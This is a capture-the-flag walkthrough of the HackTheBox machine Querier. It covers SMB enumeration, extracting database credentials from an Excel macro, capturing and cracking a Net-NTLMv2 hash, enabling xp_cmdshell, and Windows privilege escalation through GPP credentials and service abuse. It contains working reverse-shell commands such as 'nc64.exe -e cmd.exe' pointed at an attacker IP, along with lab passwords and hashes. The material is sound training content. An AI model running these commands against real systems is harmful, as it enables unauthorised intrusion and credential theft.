---
title: HTB: Querier
url: https://0xdf.gitlab.io/2019/06/22/htb-querier.html
date: 2019-06-22T14:45:00+00:00
difficulty: Medium [30]
os: Windows
tags: ctf, htb-querier, hackthebox, nmap, windows, smb, smbclient, olevba, macros, vba, mssql, mssqlclient, xp-dirtree, net-ntlmv2, responder, hashcat, xp-cmdshell, powerup, gpp, smbserver, nc, wmiexec, service, htb-giddy, oscp-plus-v2, osep-like
---

![Querier-cover](https://0xdfimages.gitlab.io/img/querier-cover.png)

Querier was a fun medium box that involved some simple document forensices, mssql access, responder, and some very basic Windows Privesc steps. I’ll show how to grab the Excel macro-enabled workbook from an open SMB share, and find database credentials in the macros. I’ll use those credentials to connect to the host’s MSSQL as a limited user. I can use that limited access to get a Net-NTLMv2 hash with responder, which provides enough database access to run commands. That’s enough to provide a shell. For privesc, running PowerUp.ps1 provides administrator credentials from a GPP file. In Beyond Root, I’ll look at the other four things that PowerUp points out, and show how one of them will also provide a shell as SYSTEM.

## Box Info

| Name | [Querier](https://hackthebox.com/machines/querier)  [Querier](https://hackthebox.com/machines/querier) [Play on HackTheBox](https://hackthebox.com/machines/querier) |
| --- | --- |
| Release Date | [16 Feb 2019](https://twitter.com/hackthebox_eu/status/1096437952559964160) |
| Retire Date | 15 Jun 2019 |
| OS | Windows Windows |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Querier |
| Radar Graph | Radar chart for Querier |
| First Blood User | 00:45:30[Spieler Spieler](https://app.hackthebox.com/users/58679) |
| First Blood Root | 01:29:02[snowscan snowscan](https://app.hackthebox.com/users/9267) |
| Creators | [mrh4sh mrh4sh](https://app.hackthebox.com/users/2570)  [egre55 egre55](https://app.hackthebox.com/users/1190) |

## Recon

### nmap

`nmap` gives some interesting Windows services: SMB (135/139/445), MSSQL (1433), WinRM (5985):

```

root@kali# nmap -sT -p- --min-rate 10000 -oA nmap/alltcp 10.10.10.125
Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-16 14:03 EST
Nmap scan report for 10.10.10.125
Host is up (0.018s latency).
Not shown: 65521 closed ports
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
1433/tcp  open  ms-sql-s
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 7.55 seconds

root@kali# nmap -sC -sV -oA nmap/scripts 10.10.10.125
Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-18 15:13 EST
Nmap scan report for 10.10.10.125
Host is up (0.021s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
1433/tcp open  ms-sql-s      Microsoft SQL Server  14.00.1000.00
| ms-sql-ntlm-info: 
|   Target_Name: HTB
|   NetBIOS_Domain_Name: HTB
|   NetBIOS_Computer_Name: QUERIER
|   DNS_Domain_Name: HTB.LOCAL
|   DNS_Computer_Name: QUERIER.HTB.LOCAL
|   DNS_Tree_Name: HTB.LOCAL
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2019-02-17T23:55:17
|_Not valid after:  2049-02-17T23:55:17
|_ssl-date: 2019-02-18T20:05:15+00:00; -8m25s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -8m25s, deviation: 0s, median: -8m25s
| ms-sql-info: 
|   10.10.10.125:1433: 
|     Version: 
|       name: Microsoft SQL Server 
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 
|_    TCP port: 1433
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2019-02-18 15:05:16
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.15 seconds

```

### SMB

#### Null Session Enumeration

`smbmap` doesn’t show anything with a null session:

```

root@kali# smbmap -H 10.10.10.125
[+] Finding open SMB ports....
[+] User SMB session establishd on 10.10.10.125...
[+] IP: 10.10.10.125:445        Name: 10.10.10.125
        Disk                                                    Permissions
        ----                                                    -----------
[!] Access Denied

```

And the trick I learned from [snowscan’s Sizzle write-up](https://snowscan.io/htb-writeup-sizzle/#) doesn’t work either:

```

root@kali# smbmap -u invaliduser -H 10.10.10.125
[+] Finding open SMB ports....
[!] Authentication error occurred
[!] The NETBIOS connection with the remote host timed out.
[!] Authentication error on 10.10.10.125

```

But `smbclient` does:

```

root@kali# smbclient -N -L //10.10.10.125

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Reports         Disk
Reconnecting with SMB1 for workgroup listing.
Connection to 10.10.10.125 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Failed to connect with SMB1 -- no workgroup available       

```

Most interesting is the share named reports.

#### File

I can connect to this share, and there’s a single `.xlsm` file. I’ll grab a copy and exit:

```

root@kali# smbclient -N //10.10.10.125/Reports
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Jan 28 18:23:48 2019
  ..                                  D        0  Mon Jan 28 18:23:48 2019
  Currency Volume Report.xlsm         A    12229  Sun Jan 27 17:21:34 2019

                6469119 blocks of size 4096. 1585533 blocks available
smb: \> get "Currency Volume Report.xlsm"
getting file \Currency Volume Report.xlsm of size 12229 as Currency Volume Report.xlsm (92.6 KiloBytes/sec) (average 92.6 KiloBytes/sec)
smb: \> exit   

```

### Analysis of Currency Volume Report.xlms

`.xlms` is a Microsoft Excel workbook with macros. I could take this over to a Windows host and open it, but a tool like `olevba` (part of [oletools](https://github.com/decalage2/oletools)) will give me the VBA on my Linux machine:

```

root@kali# olevba Currency\ Volume\ Report.xlsm
olevba 0.53.1 - http://decalage.info/python/oletools
Flags        Filename
-----------  -----------------------------------------------------------------
OpX:M-S-H--- Currency Volume Report.xlsm
===============================================================================
FILE: Currency Volume Report.xlsm
Type: OpenXML
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls
in file: xl/vbaProject.bin - OLE stream: u'VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

' macro to pull data for client volume reports
'
' further testing required

Private Sub Connect()

Dim conn As ADODB.Connection
Dim rs As ADODB.Recordset

Set conn = New ADODB.Connection
conn.ConnectionString = "Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6"
conn.ConnectionTimeout = 10
conn.Open

If conn.State = adStateOpen Then

  ' MsgBox "connection successful"

  'Set rs = conn.Execute("SELECT * @@version;")
  Set rs = conn.Execute("SELECT * FROM volume;")
  Sheets(1).Range("A1").CopyFromRecordset rs
  rs.Close

End If

End Sub
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls
in file: xl/vbaProject.bin - OLE stream: u'VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
(empty macro)
+------------+-------------+-----------------------------------------+
| Type       | Keyword     | Description                             |
+------------+-------------+-----------------------------------------+
| Suspicious | Open        | May open a file                         |
| Suspicious | Hex Strings | Hex-encoded strings were detected, may  |
|            |             | be used to obfuscate strings (option    |
|            |             | --decode to see all)                    |
+------------+-------------+-----------------------------------------+

```

The most interesting part there is the code the sets up the database connection:

```

Set conn = New ADODB.Connection
conn.ConnectionString = "Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6"
conn.ConnectionTimeout = 10
conn.Open

```

From this, I can get a username (“reporting”) and password (“PcwTWTHRwryjc$c6”) to connect.

### MSSQL

#### Connect

Armed with a username and password, I can connect with `mssqlclient.py`. I’ll make sure to use the `-windows-auth` flag, and I’m connected:

```

root@kali# mssqlclient.py reporting:'PcwTWTHRwryjc$c6'@10.10.10.125 -windows-auth
Impacket v0.9.19-dev - Copyright 2018 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: volume
[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'volume'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232)
[!] Press help for extra shell commands
SQL>

```

#### Enumerate

Once connected, I can check out the database. I can see my current user’s permissions:

```

SQL> SELECT * FROM fn_my_permissions(NULL, 'SERVER');
entity_name    subentity_name    permission_name
------------   ---------------   ------------------
server                           CONNECT SQL
server                           VIEW ANY DATABASE

```

I can check out the databases available:

```

SQL> SELECT name FROM master.sys.databases
name
-----------
master
tempdb
model
msdb
volume

```

I can look for user generated tables on those databases:

```

SQL> use volume
[*] ENVCHANGE(DATABASE): Old Value: volume, New Value: volume
[*] INFO(QUERIER): Line 1: Changed database context to 'volume'.
SQL> SELECT name FROM sysobjects WHERE xtype = 'U'
name
------------    

```

Unfortunately, I don’t find much of interest.

## Database Privesc: reporter –> mssql-svc

### Capture Net-NTLMv2

#### Background

In the box that Querier replaced, [Giddy](/2019/02/16/htb-giddy.html#get-net-ntlm), there was an SQL injection in a SQL Server instance where I used the `xp_dirtree` command to get it to connect to me over SMB where I was listening with `responder` to capture the Net-NTLMv2. (note posts on ntlmv2 and giddy). I’ll do the same thing here, just with direct access instead of SQLi.

I’ll use `xp_dirtree` to load a file, and I’ll tell the db that the file is in an SMB share on my hosts. The server will try to authenticate to my host, where `responder` will collect the Net-NTLMv2. For more details, check out the [Giddy writeup] and/or [my post on Net-NTLMv2].

#### xp\_dirtree / responder

I’ll start `responder`:

```

root@kali# responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 2.3.3.9

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CRTL-C

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Fingerprint hosts          [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.14]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Listening for events...

```

Next, I’ll issue the connect to load a file using `xp_dirtree` from an SMB share (that doesn’t exist) on my host:

```

SQL> xp_dirtree '\\10.10.14.14\a';
subdirectory    depth
-------------   -----------

```

It doesn’t return anything, but in the responder window, I’ve captured the necessary information:

```

[SMBv2] NTLMv2-SSP Client   : 10.10.10.125
[SMBv2] NTLMv2-SSP Username : QUERIER\mssql-svc
[SMBv2] NTLMv2-SSP Hash     : mssql-svc::QUERIER:603386f497f98c33:CDE796E771AA42296023CFE3DF531FD7:0101000000000000C0653150DE09D201C1D5449F39E6185B000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D20106000400020000000800300030000000000000000000000000300000237D06AB3470A72BFB64FBDC7EE605FD85661EA58867468F6B9360642BBC52DD0A001000000000000000000000000000000000000900200063006900660073002
F00310030002E00310030002E00310034002E0031003400000000000000000000000000
[*] Skipping previously captured hash for QUERIER\mssql-svc

```

### Crack Net-NTLMv2

Over to `hashcat` where I’ll try to brute force the password. I can find the hash type [here](https://hashcat.net/wiki/doku.php?id=example_hashes) or with a simple `grep` on the help page:

```

$ hashcat -h | grep -i netntlmv2
   5600 | NetNTLMv2                                        | Network Protocols

```

Now crack it:

```

$ hashcat -m 5600 mssql-svc.netntlmv2 /usr/share/wordlists/rockyou.txt -o mssql-svc.netntlmv2.cracked --force
hashcat (v4.0.1) starting...
...[snip]...

$ cat mssql-svc.netntlmv2.cracked
MSSQL-SVC::QUERIER:603386f497f98c33:cde796e771aa42296023cfe3df531fd7:0101000000000000c0653150de09d201c1d5449f39e6185b000000000200080053004d004200330001001e00570049004e002d00500052004800340039003200520051004100460056000400140053004d00420033002e006c006f00630061006c0003003400570049004e002d00500052004800340039003200520051004100460056002e0053004d00420033002e006c006f00630061006c000500140053004d00420033002e006c006f00630061006c0007000800c0653150de09d20106000400020000000800300030000000000000000000000000300000237d06ab3470a72bfb64fbdc7ee605fd85661ea58867468f6b9360642bbc52dd0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0031003400000000000000000000000000:corporate568

```

### Log in as mssql-srv

Armed with the username “mssql-src” and password “corporate568”, I can now log in with the new creds:

```

root@kali# mssqlclient.py mssql-svc:'corporate568'@10.10.10.125 -windows-auth
Impacket v0.9.19-dev - Copyright 2018 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'master'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232)
[!] Press help for extra shell commands
SQL> 

```

## Shell as mssql-svc

### Enumeration

With access to the mssql-svc account, I have a lot more privilege on the database:

```

SQL> SELECT * FROM fn_my_permissions(NULL, 'SERVER');
entity_name     subentity_name     permission_name
-------------   ----------------   --------------------------------
server                             CONNECT SQL                                                            
server                             SHUTDOWN                                                               
server                             CREATE ENDPOINT                                                        
server                             CREATE ANY DATABASE                                                    
server                             CREATE AVAILABILITY GROUP                                              
server                             ALTER ANY LOGIN                                                        
server                             ALTER ANY CREDENTIAL                                                   
server                             ALTER ANY ENDPOINT                                                     
server                             ALTER ANY LINKED SERVER                                                
server                             ALTER ANY CONNECTION                                                   
server                             ALTER ANY DATABASE                                                     
server                             ALTER RESOURCES                                                        
server                             ALTER SETTINGS                                                         
server                             ALTER TRACE                                                            
server                             ALTER ANY AVAILABILITY GROUP                                           
server                             ADMINISTER BULK OPERATIONS                                             
server                             AUTHENTICATE SERVER                                                    
server                             EXTERNAL ACCESS ASSEMBLY                                               
server                             VIEW ANY DATABASE                                                      
server                             VIEW ANY DEFINITION                                                    
server                             VIEW SERVER STATE                                                      
server                             CREATE DDL EVENT NOTIFICATION                                          
server                             CREATE TRACE EVENT NOTIFICATION                                        
server                             ALTER ANY EVENT NOTIFICATION                                           
server                             ALTER SERVER STATE                                                     
server                             UNSAFE ASSEMBLY                                                        
server                             ALTER ANY SERVER AUDIT                                                 
server                             CREATE SERVER ROLE                                                     
server                             ALTER ANY SERVER ROLE                                                  
server                             ALTER ANY EVENT SESSION                                                
server                             CONNECT ANY DATABASE                                                   
server                             IMPERSONATE ANY LOGIN                                                  
server                             SELECT ALL USER SECURABLES                                             
server                             CONTROL SERVER  

```

### xp\_cmdshell

It still won’t let me run `xp_cmdshell`, the command to run commands:

```

SQL> xp_cmdshell whoami
[-] ERROR(QUERIER): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.

```

Note, the actual syntax to run a command is `EXEC xp_cmdshell '[command]';`. However, the client I’m using to connect, `mssqlclient.py` has a build in command to run a command over `xp_cmdshell`, so I can just type `xp_cmdshell [command]`.

As mssql-svc, I can enable `xp_cmdshell` (something I couldn’t do as reporting). Just like running a command, there is an alias to do this in the script. The full commands are (from [Microsoft’s documentation](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option?view=sql-server-2017)):

```
-- To allow advanced options to be changed.  
EXEC sp_configure 'show advanced options', 1;  
GO  
-- To update the currently configured value for advanced options.  
RECONFIGURE;  
GO  
-- To enable the feature.  
EXEC sp_configure 'xp_cmdshell', 1;  
GO  
-- To update the currently configured value for this feature.  
RECONFIGURE;  
GO

```

The shell’s alias works:

```

SQL> enable_xp_cmdshell
[*] INFO(QUERIER): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
[*] INFO(QUERIER): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.

SQL> xp_cmdshell whoami
output
--------------------------------------------------------------------------------
querier\mssql-svc
NULL

```

### Shell

To get a full shell on the box, there are many ways to go. I’ll host `nc` on an smb server, and let windows run it from there.

Start my smb server:

```

root@kali# ls smb/
nc64.exe
root@kali# smbserver.py -smb2support a smb/
Impacket v0.9.19-dev - Copyright 2018 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed

```

I’ll also start a `nc` listener on port 443. Then I’ll tell the Windows box to run it from the share:

```

SQL> xp_cmdshell \\10.10.14.14\a\nc64.exe -e cmd.exe 10.10.14.14 443
output                                                            
--------------------------------------------------------------------------------
NULL  

```

In the `nc` window (remember to `rlwrap` for arrow key support):

```

root@kali# rlwrap nc -lnvp 443
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.125.
Ncat: Connection from 10.10.10.125:49683.
Microsoft Windows [Version 10.0.17763.292]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>

```

Here’s that entire thing:

![](https://0xdfimages.gitlab.io/img/querier-shell.gif)

From there, I can grab `user.txt`:

```

C:\Users\mssql-svc\Desktop>type user.txt
c37b41bb...

```

## Privesc: mssql-svc –> Administrator

### Enumeration

One of the best enumeration scripts for Windows is `PowerUp.ps1` from [PowerSploit](https://github.com/PowerShellMafia/PowerSploit). To run it here, I’ll make a copy of it in the smb share:

```

root@kali# cp /opt/PowerSploit/Privesc/PowerUp.ps1 smb/

```

The `nc` shell is stable enough to load an interactive PowerShell session:

```

C:\Users\mssql-svc\Desktop>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\mssql-svc\Desktop> whoami
querier\mssql-svc

```

Windows sometimes has issues loading PowerShell scripts off of file shares, but I can move to temp, copy the file there, and then import it:

```

PS C:\Users\mssql-svc\Desktop> cd ..\appdata\local\temp

PS C:\Users\mssql-svc\appdata\local\temp> xcopy \\10.10.14.14\a\PowerUp.ps1 .
xcopy \\10.10.14.14\a\PowerUp.ps1 .
\\10.10.14.14\a\PowerUp.ps1
1 File(s) copied

PS C:\Users\mssql-svc\appdata\local\temp> . .\PowerUp.ps1
. .\PowerUp.ps1

```

Now I can run it with `Invoke-AllChecks`:

```

PS C:\Users\mssql-svc\appdata\local\temp> Invoke-AllChecks

Privilege   : SeImpersonatePrivilege
Attributes  : SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
TokenHandle : 2212
ProcessId   : 192
Name        : 192
Check       : Process Token Privileges

ServiceName   : UsoSvc
Path          : C:\Windows\system32\svchost.exe -k netsvcs -p
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -Name 'UsoSvc'
CanRestart    : True
Name          : UsoSvc
Check         : Modifiable Services

ModifiablePath    : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
IdentityReference : QUERIER\mssql-svc
Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
%PATH%            : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
Name              : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
Check             : %PATH% .dll Hijacks
AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'

UnattendPath : C:\Windows\Panther\Unattend.xml
Name         : C:\Windows\Panther\Unattend.xml
Check        : Unattended Install Files

Changed   : {2019-01-28 23:12:48}
UserNames : {Administrator}
NewName   : [BLANK]
Passwords : {MyUnclesAreMarioAndLuigi!!1!}
File      : C:\ProgramData\Microsoft\Group
            Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml
Check     : Cached GPP Files

```

There’s a ton of interesting stuff in here, and I’ll spend some time on each of these in Beyond Root. For now, I’ll jump on the most obvious result, the GPP password file with the username / password combination of “Administrator” / “MyUnclesAreMarioAndLuigi!!1!”.

### Administrator Shell

With the administrator account password, a shell is pretty simple. I’ll use `wmiexec`:

```

root@kali# wmiexec.py 'administrator:MyUnclesAreMarioAndLuigi!!1!@10.10.10.125'
Impacket v0.9.19-dev - Copyright 2018 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
querier\administrator

```

From there, `root.txt` is simple:

```

C:\users\administrator\desktop>type root.txt
b19c3794...

```

## Beyond Root

### Overview of results

[PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) showed five potential paths to SYSTEM:
- SeImpersonatePrivilege
- Modifiable Service - UsoSvc
- %PATH% .dll Hijacks
- Unattended Install Files
- Cached GPP Files

I used the last one to get Administrator access in the main write up, as it simply provided the administrator credentials, and it’s pretty easy to understand.

I’ll take a look at the other four results.

### RIP Juicy Potato

It seems like Microsoft may have fixed the [path from SeImpresonate to SYSTEM in Server 2019](https://decoder.cloud/2018/10/29/no-more-rotten-juicy-potato/), and that’s what this host is:

```

PS C:\Users\mssql-svc\Desktop> gwmi win32_operatingsystem | % caption
Microsoft Windows Server 2019 Standard 

```

So this is a dead end.

### Unattended Install Files

Jumping to the fourth item, there can be passwords in `unattended.xml` files. Unfortunately for me, not in these:

```

PS C:\windows\panther> type unattend.xml | findstr /i password
type unattend.xml | findstr /i password
     <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Password>*SENSITIVE*DATA*DELETED*</Password>

```

### Modifiable Service Abuse

One thing that `Invoke-AllChecks` runs is the `Get-ModifiableService` commandlet. It:

> Enumerates all services and returns services for which the current user can modify the binPath.

This is what produced the following output when I ran `Invoke-AllChecks` above:

```

ServiceName   : UsoSvc
Path          : C:\Windows\system32\svchost.exe -k netsvcs -p
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -Name 'UsoSvc'
CanRestart    : True
Name          : UsoSvc
Check         : Modifiable Services

```

They suggest running `Invoke-ServiceAbuse`. I’ll take a look at [the source for this function](https://github.com/PowerShellMafia/PowerSploit/blob/c7985c9bc31e92bb6243c177d7d1d7e68b6f1816/Privesc/PowerUp.ps1#L1644). It will enable the service (if it isn’t already enabled), and backup the current service binary. It will then set the service to run the input commands, run the service, wait, then stop the service, and restore the original binary.

```

PS C:\Users\mssql-svc\AppData\Local\Temp> Invoke-ServiceAbuse -Name 'UsoSvc' -Command "\\10.10.14.14\a\nc64.exe -e cmd.exe 10.10.14.14 443"                                                                                                 
Invoke-ServiceAbuse -Name 'UsoSvc' -Command "\\10.10.14.14\a\nc64.exe -e cmd.exe 10.10.14.14 443"

ServiceAbused Command
------------- -------
UsoSvc        \\10.10.14.14\a\nc64.exe -e cmd.exe 10.10.14.14 443

```

And get a shell as SYSTEM:

```

root@kali# nc -lvnp 443
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.125.
Ncat: Connection from 10.10.10.125:49682.
Microsoft Windows [Version 10.0.17763.292]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

```

However, because the script is made to run commands and then stop the service, it dies quickly (even if it tried to leave them going, `nc64.exe` isn’t a service binary so it would die very quickly). I could use `msfvenom` to create a service binary, or I can just have the first shell execute `nc` again. That new `nc` process will live on even after it’s parent has died:

```

root@kali# nc -lvnp 443
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.125.
Ncat: Connection from 10.10.10.125:49686.
Microsoft Windows [Version 10.0.17763.292]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>\\10.10.14.14\a\nc64.exe -e cmd.exe 10.10.14.14 444
\\10.10.14.14\a\nc64.exe -e cmd.exe 10.10.14.14 444

```

I could also have had the `PowerUp` command add an admin user, or schedule a task to run `nc` and connect back to me every minute. Both of those commands would run and finish quickly, without issue.

### .dll Hijack

`Invoke-AllChecks` also runs `Find-PathDLLHijack`, which:

> Enumerates the paths stored in Env:Path (%PATH) and filters each through Get-ModifiablePath to return the folder paths the current user can write to.

The run on Querier returned:

```

ModifiablePath    : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
IdentityReference : QUERIER\mssql-svc
Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
%PATH%            : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
Name              : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
Check             : %PATH% .dll Hijacks
AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'

```

It’s saying that that I can write to the dll at the location in `AppData`. The problem is, I don’t have a good way to then restart a service or anything else that will use this dll and is running as administrator or system, so it’s a dead end for HTB.